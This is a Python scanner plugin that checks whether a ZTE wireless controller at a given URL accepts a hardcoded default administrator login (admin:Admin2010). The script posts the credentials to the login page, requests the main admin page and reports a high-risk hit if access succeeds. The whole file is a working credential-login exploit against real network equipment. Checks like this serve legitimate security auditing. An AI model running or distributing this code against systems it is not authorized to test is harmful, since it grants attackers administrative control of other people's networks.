#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 中兴无线控制器弱口令
referer: unknown
author: Lucifer
description: 中兴无线控制器存在弱口令可直接登录管理员界面。
'''
import sys
import requests


class zte_wireless_weak_pass_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/login.php"
        vulnurl = self.url + payload
        post_data ={
            "UserName":"admin",
            "PassWord":"Admin2010",
            "LoginEnglish":"Login",
            "LoginTraditionalChinese":"%E7%99%BB+%E9%8C%84"
        }
        try:
            sess = requests.Session()
            req = sess.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            vulnurl2 = self.url + "/main.php"
            req2 = sess.get(vulnurl2, headers=headers, timeout=10, verify=False)
            if r"Welcome.php" in req2.text and r"Selector.php" in req2.text:
                return "[+]存在中兴无线控制器弱口令漏洞...(高危)\tpayload: "+vulnurl+"\t弱口令: admin:Admin2010"
            else:
                return "[-]no"

        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = zte_wireless_weak_pass_BaseVerify(sys.argv[1])
    testVuln.run()